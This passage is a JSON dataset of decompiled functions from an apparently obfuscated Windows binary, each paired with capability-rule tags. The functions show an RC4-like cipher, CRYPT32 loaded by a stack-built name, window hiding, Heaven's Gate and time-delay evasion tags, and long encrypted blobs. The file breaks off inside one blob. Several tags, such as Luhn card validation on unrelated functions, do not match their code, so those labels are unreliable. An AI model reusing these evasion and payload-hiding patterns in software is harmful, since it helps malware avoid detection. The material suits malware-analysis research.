{
    "00401080": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00401080(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint8_t auStack896 [896];\n    \n    uVar4 = 0;\n    iVar7 = 0;\n    uVar6 = 0;\n    uVar5 = 0;\n    iVar3 = 0;\n    do {\n        auStack896[iVar3] = iVar3;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x37e);\n    iVar3 = 0;\n    do {\n        uVar1 = auStack896[iVar3];\n        uVar4 = *(iVar7 + param_3) + uVar1 + uVar4 & 0x1fe;\n        auStack896[iVar3] = auStack896[uVar4];\n        auStack896[uVar4] = uVar1;\n        iVar7 = (iVar7 + 1) % param_4;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x37e);\n    iVar3 = 0;\n    if (0 < param_2) {\n        do {\n            uVar6 = uVar6 + 1 & 0x1fe;\n            uVar1 = auStack896[uVar6];\n            uVar5 = uVar5 + uVar1 & 0x1fe;\n            uVar2 = auStack896[uVar5];\n            auStack896[uVar6] = uVar2;\n            auStack896[uVar5] = uVar1;\n            *(iVar3 + param_1) = *(iVar3 + param_1) ^ auStack896[uVar2 + uVar1];\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < param_2);\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "004225ba": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004225ba(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "004011f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint32_t fcn.004011f0(uint param_1, uint param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    code *pcVar5;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    ushort uStack12;\n    ushort uStack10;\n    ushort uStack8;\n    ushort uStack6;\n    int32_t *piStack4;\n    \n    if (param_3 == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    uStack6 = 0x4c;\n    uStack24 = 0x43;\n    pcVar5 = NULL;\n    uStack22 = 0x52;\n    uStack20 = 0x59;\n    uStack18 = 0x50;\n    uStack16 = 0x54;\n    uStack14 = 0x33;\n    uStack12 = 0x32;\n    uStack10 = 0x2e;\n    uStack8 = 0x44;\n    piStack4 = 0x4c;\n    iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(&uStack24, 0, 0);\n    if (iVar3 != 0) {\n        pcVar5 = fcn.00401140(iVar3, &stack0xffffffc4);\n    }\n    piVar2 = piStack4;\n    iVar3 = (*pcVar5)(param_3, param_1, 1, 0, piStack4, 0, 0);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x6e69426f = fcn.0040ae6e(*piVar2 + 1);\n    pcVar1 = _sym.imp.USER32.dll_ShowWindow;\n    (*_sym.imp.USER32.dll_ShowWindow)(0, 0);\n    (*pcVar1)(0, 0);\n    (*pcVar1)(0, 0);\n    uVar4 = (*pcVar5)(unaff_EBX, 0x70797243, 1, *0x6e69426f, piVar2, 0, 0);\n    return uVar4 & 0xffffff00 | uVar4 != 0;\n}\n",
        "token_count": 571
    },
    "00415c79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n\ncode ** __cdecl fcn.00415c79(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_20h;\n    uint var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0xd);\n    fcn.004024b0(0);\n    uVar2 = fcn.0040f370(\"string too long\");\n    fcn.00402500(\"string too long\", uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.00415cd3(unaff_EBP + -0x20);\n    *(unaff_EBP + -0x3c) = vtable.std::length_error.0;\n    fcn.0040c2cc(unaff_EBP + -0x3c, 0x431088);\n    fcn.0040b7d8();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0x44b7b4;\n    fcn.0041a667(unaff_EBP + -0x10);\n    puVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = *puVar1;\n    fcn.004024b0(0);\n    fcn.004022b0(puVar1, 0, *0x4295b4);\n    uVar2 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::logic_error.0;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 463
    },
    "00415ea5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nvoid fcn.00415ea5(void)\n\n{\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_dh;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0xd);\n    fcn.004024b0(0);\n    uVar1 = fcn.0040f370(\"invalid string position\");\n    fcn.00402500(\"invalid string position\", uVar1);\n    *(unaff_EBP + -4) = 0;\n    fcn.00415cd3(unaff_EBP + -0x20);\n    arg_8h = unaff_EBP + -0x3c;\n    *(unaff_EBP + -0x3c) = vtable.std::out_of_range.0;\n    fcn.0040c2cc(arg_8h, 0x4311b0);\n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::logic_error.0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004024b0(1, arg_8h, extraout_ECX);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041a6ee();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 393
    },
    "00417c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00417c10(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    char *pcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    int32_t iStack80;\n    int32_t aiStack76 [4];\n    int32_t aiStack32 [4];\n    uint uStack16;\n    uint uStack12;\n    int32_t iStack8;\n    uint uStack4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    if (*0x44f3e0 == 0) {\n        return 0;\n    }\n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 + 1;\n        aiStack76[3] = *(uVar3 * 2 + 0x42cc20);\n        aiStack76[2] = 0x417c43;\n        uVar2 = (*pcVar1)();\n        *(&stack0xffffffe0 + uVar3 * 4) = uVar2;\n        uVar3 = uVar5;\n    } while (uVar5 < 8);\n    if (*0x44f400 == 0x300) {\n        aiStack32[0] = 0xffffff;\n    }\n    if (((iStack8 == 0) || (aiStack32[1] == iStack8)) && (iStack8 = 0xc0c0c0,  aiStack32[1] != 0x808080)) {\n        iStack8 = 0x808080;\n    }\n    bVar10 = param_1 == 0;\n    if (bVar10) {\n        iVar4 = 0x20;\n        pcVar6 = 0x44f404;\n        pcVar8 = &stack0xffffffe0;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            bVar10 = *pcVar6 == *pcVar8;\n            pcVar6 = pcVar6 + 1;\n            pcVar8 = pcVar8 + 1;\n        } while (bVar10);\n        if (bVar10) {\n            return 1;\n        }\n    }\n    aiStack76[3] = uStack4;\n    aiStack76[2] = uStack16;\n    aiStack76[1] = aiStack32[0];\n    aiStack76[0] = aiStack32[2];\n    iStack80 = aiStack32[1];\n    iStack80 = fcn.00419e40(*0x44f3f8, 0x67c7, uStack12);\n    pcVar1 = _sym.imp.GDI32.dll_CreateSolidBrush;\n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 + 1;\n        uVar2 = (*pcVar1)(*(&stack0xffffffc0 + uVar3 * 4));\n        *(&stack0xffffffb4 + uVar3 * 4) = uVar2;\n        uVar3 = uVar5;\n    } while (uVar5 < 3);\n    uVar5 = 0;\n    do {\n        if (*(&stack0xffffffb4 + uVar5 * 4) == 0) goto code_r0x00417d68;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 3);\n    if (iStack80 != 0) {\n        fcn.00416b70();\n        *0x44f424 = aiStack76[0];\n        *0x44f428 = aiStack76[1];\n        *0x44f42c = aiStack76[2];\n        puVar7 = &stack0xffffffc0;\n        puVar9 = 0x44f404;\n        for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *0x44f430 = iStack80;\n        return 1;\n    }\ncode_r0x00417d68:\n    uVar5 = 0;\n    do {\n        uVar3 = uVar5;\n        uVar5 = uVar5 + 1;\n        fcn.00416b50(&stack0xffffffb4 + uVar3 * 4);\n    } while (uVar5 < 3);\n    fcn.00416b50(&stack0xffffffb0);\n    return 0;\n}\n",
        "token_count": 1054
    },
    "0041e083": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.0041e083(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpWindowName;\n    uint lpClassName;\n    uint dwExStyle;\n    \n    dwExStyle = arg_8h;\n    lpClassName = arg_ch;\n    lpWindowName = arg_10h;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.00423ff7();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 0x5c))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0xa4))();\n        bVar3 = false;\n    }\n    else {\n        fcn.0041dff5();\n        iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (dwExStyle, lpClassName, lpWindowName, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, \n                           var_28h, var_2ch, var_30h);\n        iVar2 = fcn.0041e041();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0xa4))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 527
    },
    "0041e736": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041e736(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpWndClass;\n    uint var_ah;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffc4;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x38);\n    if (iVar4 == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n        if (iVar3 == 0) {\n            uVar5 = 0;\n            goto code_r0x0041e7b6;\n        }\n        iVar4 = fcn.00423ff7();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.00424b3c(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.00423ff7();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            (*_sym.imp.KERNEL32.dll_lstrcatA)(iVar4 + 0x34, *(iVar1 + 0x24));\n            *(unaff_EBP + 10) = 10;\n            *(unaff_EBP + 0xb) = 0;\n            (*pcVar2)(iVar4 + 0x34, unaff_EBP + 10);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00424bac(1);\n        }\n    }\n    uVar5 = 1;\ncode_r0x0041e7b6:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 579
    },
    "00401360": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401360(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    char *pcVar8;\n    code *pcVar9;\n    uint *puVar10;\n    uint *in_FS_OFFSET;\n    uint32_t uStack824;\n    uint *puStack820;\n    uchar *puStack816;\n    char *pcStack812;\n    uint uStack808;\n    uchar *puStack804;\n    uchar *puStack800;\n    char *pcStack796;\n    uint uStack792;\n    uchar *puStack788;\n    uchar *puStack784;\n    char *pcStack780;\n    uint32_t uStack776;\n    uchar *puStack772;\n    uchar *puStack768;\n    char *pcStack764;\n    uint uStack760;\n    char *pcStack756;\n    uchar *puStack752;\n    char *pcStack748;\n    uint uStack744;\n    uchar *puStack740;\n    uchar *puStack736;\n    char *pcStack732;\n    uint uStack728;\n    uchar *puStack724;\n    uint uStack720;\n    char *pcStack716;\n    uint uStack712;\n    uchar *puStack708;\n    uint uStack704;\n    char *pcStack700;\n    uint uStack696;\n    uchar *puStack692;\n    uint uStack688;\n    char *pcStack684;\n    uint uStack680;\n    uchar *puStack676;\n    uint uStack672;\n    char *pcStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint uStack656;\n    char *pcStack652;\n    uint uStack648;\n    uchar *puStack644;\n    uint uStack640;\n    char *pcStack636;\n    uint uStack632;\n    uchar *puStack628;\n    uint uStack624;\n    char *pcStack620;\n    uint uStack616;\n    uchar *puStack612;\n    uint uStack608;\n    char *pcStack604;\n    uint uStack600;\n    uchar *puStack596;\n    uint uStack592;\n    char *pcStack588;\n    uint uStack584;\n    uchar *puStack580;\n    uint uStack576;\n    char *pcStack572;\n    uint uStack568;\n    uchar *puStack564;\n    uint uStack560;\n    char *pcStack556;\n    uint uStack552;\n    uchar *puStack548;\n    uint uStack544;\n    char *pcStack540;\n    uint uStack536;\n    uchar *puStack532;\n    uint uStack528;\n    char *pcStack524;\n    uint uStack520;\n    uchar *puStack516;\n    uint uStack512;\n    char *pcStack508;\n    uint uStack504;\n    uchar *puStack500;\n    uint uStack496;\n    char *pcStack492;\n    uint uStack488;\n    uchar *puStack484;\n    uint uStack480;\n    char *pcStack476;\n    uint uStack472;\n    uchar *puStack468;\n    uint uStack464;\n    char *pcStack460;\n    uint uStack456;\n    uchar *puStack452;\n    uint uStack448;\n    char *pcStack444;\n    uint uStack440;\n    uchar *puStack436;\n    uint uStack432;\n    char *pcStack428;\n    uint uStack424;\n    uchar *puStack420;\n    uint uStack416;\n    char *pcStack412;\n    uint uStack408;\n    uchar *puStack404;\n    uint uStack400;\n    char *pcStack396;\n    uint uStack392;\n    uchar *puStack388;\n    uint uStack384;\n    char *pcStack380;\n    uint uStack376;\n    uchar *puStack372;\n    uint uStack368;\n    char *pcStack364;\n    uint uStack360;\n    uchar *puStack356;\n    uint uStack352;\n    char *pcStack348;\n    uint uStack344;\n    uchar *puStack340;\n    uint uStack336;\n    char *pcStack332;\n    uint uStack328;\n    uchar *puStack324;\n    uint uStack320;\n    char *pcStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    char *pcStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    char *pcStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint uStack272;\n    char *pcStack268;\n    uint uStack264;\n    uchar *puStack260;\n    uint uStack256;\n    char *pcStack252;\n    uint uStack248;\n    uchar *puStack244;\n    uint uStack240;\n    char *pcStack236;\n    uint uStack232;\n    uchar *puStack228;\n    uint uStack224;\n    char *pcStack220;\n    uint uStack216;\n    uchar *puStack212;\n    uint uStack208;\n    char *pcStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint uStack192;\n    char *pcStack188;\n    uint uStack184;\n    uchar *puStack180;\n    uint uStack176;\n    char *pcStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint uStack160;\n    char *pcStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    char *pcStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    char *pcStack124;\n    char *pcStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uchar auStack88 [8];\n    uchar uStack80;\n    uchar uStack76;\n    uchar auStack72 [8];\n    uchar uStack64;\n    uchar uStack60;\n    uchar uStack48;\n    uchar uStack44;\n    uchar uStack32;\n    uchar uStack28;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x427cd0;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack112 = 0;\n    puVar6 = NULL;\n    iStack116 = 0x401391;\n    fcn.004024b0();\n    uVar5 = 0xffffffff;\n    uStack8 = 0;\n    pcVar8 = \n    \"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\"\n    ;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    iStack116 = ~uVar5 - 1;\n    pcStack120 = \n    \"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\"\n    ;\n    pcStack124 = 0x4013b3;\n    fcn.00402500();\n    uStack128 = &stack0xffffffa8;\n    pcStack124 = \n    \"w3yEBunWZmuRMS7A+Q+TRVqnzf6JfdhRtiuFdsLzKfmgcH1uCD913dB9wLhgjnZcs1JrNNjeYczXMYRYOaCVldXRYjG0gv+UshveL0zFUtAiHhlPZzA2WhA33ObK8k8QFbAJbj5nhDu4N3nFxpSOhEYyZMYDZhqaLFrMUWYlhiIG6y+cKhzzRLfGjCGGQ1bwYWaEPtoQt3bFzBDMTXUg1Ba4LkVFrpUHNZrsUkXwSasNpnW4wnTYRTtFTkButHwGCPgDwKxi4kWdtxN469jkPFgGZ03eDj4OIRhyNJZIsKS7vQj+1MJJTU/CqjfwICr5tuuQir7YmtgDskPwoEp5RRwHDjfXODTCdDcdMGYIE15KU2SAkJ10Jn7W+lY7IFxctEZJUMKjYuWQWr9M7wKy+akOGE49GZ5TYMWg3ZmUb35ZRhhE6wIfVLzXeB5TVz2cYBXMNDDedPA8WjoBMNMTRZhM8+N5TAEdku9iIfJPlLjmLoqcSzuOjjjyZLK4xkIWsnm6Vzdy5DvA+JQJTVY41yAZIEKMWrjkOKqiZ3RISjaBlNeK+GDszR15+8AsLDFWPR8ngDE8eUgcKw441TqBWtZxOjygcZxmZj5WegMlDmBcOH8Sz5cmNV/WmgUVXkNCtwmjAX9ytA8wN1QNO1YNYm9IGkL0O1Bv2By4IJxCvyoiKtdnBp8clb96IDaj7mNhYFbYZMxgfvK3QuQ8ZFq/7jpl1Qs9COL2HwlmEx9kpnlyIoj6ZHT/COdSVTZxSfQWomRMHqydoLK29LisrCLe8ktHRgh1IR7l6rCGOjfkf3xEiHELpgwIGCpInzt0iioOLUbmuqJcLCh8HlwBlHl5nIA2GDZIthPaQmBaRjKNHNBSLBg2QLh1Z7Y6TUyfZJxLnAOY5/ifIvOamnLGwDdrPHp5YlagOkslt2RybnSwwCIOwm7MxmfMSSfWgGJD3hFLDrBjMnTQ3pSUT2S0Glb8gOLegQsODUsgdHJkNqaO3VxQLjQ2Yo14d1YIcio3+r9ulEjWS0uOXCFMv4V